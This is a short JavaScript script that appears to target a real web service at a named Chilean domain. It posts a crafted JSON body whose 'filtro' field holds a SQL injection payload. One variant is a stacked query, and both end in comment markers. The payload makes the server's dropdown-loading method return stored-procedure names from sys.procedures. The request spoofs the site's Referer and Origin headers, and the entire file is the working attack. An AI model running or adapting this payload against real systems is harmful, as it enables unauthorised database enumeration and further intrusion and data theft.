const url = 'http://zahr.asinco.cl/servicios/servicios_sigav.aspx/CargaDDL';

const querys = {
    procedimientos: "FROM (SELECT 1 as IdProvProveedores, name as test1 FROM sys.procedures) as P2; SELECT 1 --",
    ddlProcedimiento: "FROM (SELECT 1 as IdProvProveedores, name as test1 FROM sys.procedures) as P2 --"
}


const data = {
    id_padre: "0",
    tabla: "ProvProveedores",
    filtro: querys.ddlProcedimiento,
    campo: "test1",
    accion: "5"
}


fetch(url, {
    method: 'POST',
    body: JSON.stringify(data),
    headers: {
        "Content-Type": "application/json; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest",
        "Referer": "http://zahr.asinco.cl/",
        "Origin": "http://zahr.asinco.cl"
    }
}).then(res => res.json())
    .then(response => {
        /* console.log('respuesta del servidor ', response)*/

        console.log(response)

        /* response.d.forEach(element => {
            for (const el in element) {
                console.log(element["Attributes"])
            }
        }); */
    })
    .catch(err => console.log(err));

